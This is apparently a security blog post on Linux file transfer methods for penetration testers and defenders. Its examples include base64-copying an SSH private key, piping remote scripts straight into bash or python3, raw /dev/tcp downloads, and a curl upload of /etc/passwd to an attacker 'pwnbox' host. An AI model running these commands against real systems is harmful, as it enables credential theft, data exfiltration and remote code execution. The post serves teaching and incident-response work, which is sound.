---
title: "Linux File Transfer Methods"
date: 2025-03-16
tags: [Linux, Security, File Transfer, Incident Response]
categories: [Cybersecurity, Linux]
pinned: false
---

Linux is a versatile operating system with many different tools for file transfers. Understanding these methods can help both attackers and defenders improve their skills for network security and incident response.

## Incident Response Case Study
A few years ago, during an incident response engagement, we discovered multiple threat actors across six of nine compromised web servers. The attackers exploited an SQL Injection vulnerability and used a Bash script to download additional malware connecting to their command and control (C2) server. Their script attempted three different download methods: `cURL`, `wget`, and `Python`, all using HTTP.

## File Transfer Methods Overview
While Linux supports various protocols like FTP and SMB, HTTP and HTTPS are the most commonly used for both legitimate and malicious file transfers. In this article, we will explore multiple file transfer techniques using:
- Base64 encoding/decoding
- `wget` and `cURL`
- Fileless execution
- Bash `/dev/tcp`
- SSH (`scp`)
- Web server-based transfers

## Base64 Encoding / Decoding
For small files, network communication may not be necessary. Instead, we can use Base64 encoding to copy and transfer data manually.

### Encoding a File to Base64
```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

### Decoding on the Target Machine
```bash
echo -n '<Base64 string>' | base64 -d > id_rsa
md5sum id_rsa
```

## Web Downloads with `wget` and `cURL`
These tools are widely used for web-based file transfers.

### Download Using `wget`
```bash
wget https://example.com/file.sh -O /tmp/file.sh
```

### Download Using `cURL`
```bash
curl -o /tmp/file.sh https://example.com/file.sh
```

## Fileless Attacks in Linux
Pipes allow execution of scripts directly from the web without writing to disk.

### Fileless Execution Using `cURL`
```bash
curl https://example.com/script.sh | bash
```

### Fileless Execution Using `wget`
```bash
wget -qO- https://example.com/script.py | python3
```

## Downloading Files with Bash (`/dev/tcp`)
If common tools are unavailable, Bash can be used to download files via `/dev/tcp`.

### Connect to a Web Server
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

### Send an HTTP GET Request
```bash
echo -e "GET /file.sh HTTP/1.1\n\n" >&3
cat <&3
```

## SSH Downloads (`scp`)
Securely copy files between systems using SSH.

### Enable and Start SSH Server
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

### Transfer Files via `scp`
```bash
scp user@remote:/path/to/file .
```

## Upload Operations
We can upload files using similar methods to downloads.

### Web Upload with `curl`
```bash
curl -X POST https://pwnbox/upload -F 'files=@/etc/passwd' --insecure
```

### Hosting a Temporary Web Server
#### Python3 HTTP Server
```bash
python3 -m http.server 8000
```

#### PHP HTTP Server
```bash
php -S 0.0.0.0:8000
```

#### Ruby Web Server
```bash
ruby -run -e httpd . -p8000
```

### Uploading Files via `scp`
```bash
scp /etc/passwd user@remote:/path/to/destination
```

## Conclusion
Understanding Linux file transfer methods is crucial for both cybersecurity professionals and system administrators. These techniques are commonly used in penetration testing, incident response, and threat detection. By mastering these methods, defenders can better mitigate threats and attackers can refine their exploitation strategies.
